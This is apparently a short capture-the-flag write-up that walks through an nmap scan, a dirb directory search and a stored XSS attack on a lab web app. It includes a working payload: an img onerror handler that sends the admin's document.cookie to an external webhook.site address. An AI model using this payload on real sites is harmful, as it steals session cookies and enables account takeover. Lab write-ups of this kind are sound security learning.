1) connecting to the IP via browser amounted to nothing, so i did an nmap scan on it, nmap IP 
2) port 3000 was open, after research i found this can be used as a http port, so i used my browser to navigate to IP:3000, bingo
(after doing this i realised it tells us to use port 3000 in the challenge description, always read the brief!)
3) dirb the site, which tells you about the /admin page
4) one of the workers mentions that the admin looks at this page, so we need to send their cookie to us through an xss attack

replace the webhook.site link with your own instance of webhook, and put the following into the input field
<img src="/" onerror="var xhttp = new XMLHttpRequest(); xhttp.open('GET', 'https://webhook.site/a72d4900-1f3b-40e2-b2a1-029d3e649068?cookie=' + document.cookie, false);xhttp.send();">
wait 2 minuites and look on webhook, you will see the admin's cookie
(make sure you have made an account first and are logged in)
